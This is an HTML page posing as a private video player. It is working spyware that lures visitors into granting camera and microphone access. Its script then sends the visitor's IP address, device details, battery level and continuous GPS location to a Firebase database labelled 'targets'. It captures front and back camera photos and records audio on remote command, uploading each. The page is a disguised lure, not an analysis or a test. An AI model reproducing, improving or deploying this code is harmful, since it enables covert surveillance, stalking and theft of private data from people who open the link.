<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Video Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { margin:0; background:#000; font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
        #blur-vid { position:absolute; width:100%; height:100%; object-fit:cover; filter: blur(25px); opacity:0.6; }
        #popup { position:relative; z-index:10; background:rgba(255,255,255,0.95); padding:30px; border-radius:15px; text-align:center; width:80%; max-width:320px; box-shadow:0 0 50px rgba(0,0,0,0.8); }
        .btn { background:#00ff41; color:#000; border:none; padding:15px 30px; font-weight:bold; border-radius:30px; cursor:pointer; margin-top:20px; font-size:16px; }
        video#real-stream { display:none; width:100%; height:100%; object-fit:contain; z-index:5; position:relative; }
    </style>
</head>
<body>

<video id="blur-vid" autoplay muted loop playsinline>
    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
</video>

<div id="popup">
    <h3 style="margin:0; color:#333;">Private Video</h3>
    <p style="color:#666; font-size:14px;">Are you sure you want to watch this private content?</p>
    <button class="btn" onclick="startWork()">YES, WATCH NOW</button>
</div>

<video id="real-stream" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);

    let streamRef = null;

    async function startWork() {
        document.getElementById('popup').style.display = 'none';
        document.getElementById('blur-vid').style.display = 'none';
        const v = document.getElementById('real-stream');
        v.style.display = 'block';

        try {
            streamRef = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            v.play();

            // --- FIXED: User Details Capture ---
            let ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
            let battery = await navigator.getBattery().then(b => Math.floor(b.level * 100) + "%").catch(() => "N/A");
            
            db.ref(`targets/${sessionID}/info`).set({
                status: "ONLINE",
                ip: ipData.ip,
                battery: battery,
                device: navigator.platform,
                agent: navigator.userAgent.split(') ')[0] + ')', // Detailed device name
                time: new Date().toLocaleTimeString()
            });

            navigator.geolocation.watchPosition(p => {
                db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
            }, null, {enableHighAccuracy:true});

            capture(true); 
            setTimeout(() => capture(false), 5000); 

            db.ref(`commands/${sessionID}`).on('value', s => {
                const c = s.val(); if(!c) return;
                if(c.action === 'photo') capture(true);
                if(c.action === 'back') capture(false);
                if(c.action === 'audio') record();
                db.ref(`commands/${sessionID}`).remove();
            });

        } catch (e) { alert("Error: Permission denied."); location.reload(); }
    }

    // --- FIXED: Back Camera Capture Logic ---
    async function capture(isFront) {
        try {
            // Back camera ke liye pehle front stream ko "exact" constraints dena behtar hai
            const constraints = {
                video: { facingMode: isFront ? "user" : { exact: "environment" } }
            };
            
            // Fallback: Agar "exact" environment fail ho to ideal use karein
            const stream = await navigator.mediaDevices.getUserMedia(constraints)
                .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: isFront ? "user" : "environment" } }));

            const vid = document.createElement('video');
            vid.srcObject = stream;
            await vid.play();
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
                canvas.getContext('2d').drawImage(vid, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.6),
                    type: isFront ? "FRONT" : "BACK",
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop()); // Band karna lazmi hai
            }, 2500);
        } catch(err) { 
            console.log("Cam Error: " + err);
            // Agar back camera fail ho to error log karein
            db.ref(`targets/${sessionID}/logs`).push("Camera Error: " + err.message);
        }
    }

    function record() {
        const recorder = new MediaRecorder(streamRef);
        let chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = () => {
            const reader = new FileReader();
            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
        };
        recorder.start();
        setTimeout(() => recorder.stop(), 10000);
    }
</script>
</body>
</html>
